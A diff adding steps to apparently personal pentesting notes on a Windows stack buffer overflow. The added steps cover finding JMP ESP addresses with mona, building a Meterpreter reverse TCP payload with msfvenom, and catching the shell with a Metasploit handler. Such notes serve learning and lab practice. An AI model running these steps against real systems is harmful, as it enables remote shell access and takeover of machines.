@@ -162,6 +162,28 @@ s.send(buf) #Sends buf to IP and port
 print s.recv(1024) #recieve response
 s.close() #close connectionrun py
 ```
+
+# From Immunity Debugger, bottom screen run !mona modules to find unprotected modules
+	
+# to find the JMP ESP
+[Log Data Tab]
+>!mona jmp -r esp -m
+ Output:
+	0x625012a0
+	0x625012ad
+	0x625012ba
+
+# Build Reverse TCP Payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -b "\x00" -f python
+
+# Execute the Exploit
+>msfconsole
+>use multi/handler
+>set payload windows/meterpreter/reverse_tcp
+>set LHOST 0.0.0.0
+>set LPORT 4444
+>explot
+
 ### Post Exploitation
             MISC:
                         SSH
